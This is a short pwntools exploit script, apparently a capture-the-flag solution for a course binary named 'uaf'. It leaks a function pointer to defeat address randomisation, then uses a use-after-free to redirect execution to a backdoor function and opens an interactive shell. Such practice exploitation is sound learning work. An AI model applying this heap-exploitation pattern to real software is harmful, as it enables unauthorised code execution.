from pwn import *

context.binary = './uaf'

welcome_func = 0xa64
bye_func = 0xa77
backdoor = 0xab5

#r = remote('edu-ctf.csie.org', 10177)
r = process('./uaf')
r.recvuntil('Size of your messege: ')
r.sendline('16')
r.recvuntil('Messege: ')
r.send('a' * 8)
r.recvuntil('a' * 8)

base = u64(r.recv(6) + '\0\0') - bye_func
print hex(base)
backdoor = base + backdoor

r.recvuntil('Size of your messege: ')
r.sendline('16')
r.recvuntil('Messege: ')
r.sendline('a' * 8 + p64(backdoor))

#r.recvuntil('Size of your messege: ')
#r.sendline('16')
#r.recvuntil('Messege: ')
#r.sendline('a')

r.interactive()
